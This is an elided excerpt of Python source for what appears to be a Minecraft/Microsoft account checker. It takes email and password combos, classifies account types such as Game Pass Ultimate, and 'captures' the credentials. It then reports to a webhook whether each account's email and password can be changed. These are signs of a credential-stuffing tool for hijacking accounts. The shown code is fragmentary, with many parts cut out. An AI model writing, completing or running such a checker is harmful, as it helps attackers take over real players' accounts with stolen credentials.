...
# Linux-specific terminal setup
if os.name != 'nt':
    # Enable ANSI escape codes on Linux/Unix
    init(autoreset=True)
...
class Capture:
    ...
    def notify(self):
        ...
        try:
            ...
            # NORMAL webhook: Everything else (SFA, MFA, 2FA, no ban check, version errors, Other accounts)
            ...
            if True:
                ...
                if hasattr(self, 'email_changeable') and self.email_changeable is not None and self.email_changeable != "None":
                    emoji = "<a:rght:1434491384370434168>" if self.email_changeable == "True" else "<a:wrng:1434491325910220951>" if self.email_changeable == "False" else "<a:idkk:1434492987391475712>"
                ...
                # DonutSMP specific fields - Always show if available
    ...
    def save_changeability(self):
        ...
        try:
            ...
            if self.email_changeable == "True":
                changeable_items.append("Email")
            if self.password_changeable == "True":
...
def checkmc(session, email, password, token):
    ...
    try:
        ...
        if acctype == "Xbox Game Pass Ultimate" or acctype == "Normal Minecraft (with Game Pass Ultimate)":
            ...
            try: capture_mc(token, session, email, password, acctype)
            except: 
                CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", f"{acctype} [Unset MC]")
                CAPTURE.session = session
                CAPTURE.handle()
            return True
            ...
            if others != []:
                ...
                try: 
                    capture_mc(token, session, email, password, f"Other ({items})")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", f"Other ({items}) [Unset MC]")
                    CAPTURE.session = session
                    CAPTURE.handle()
                return True
            else:
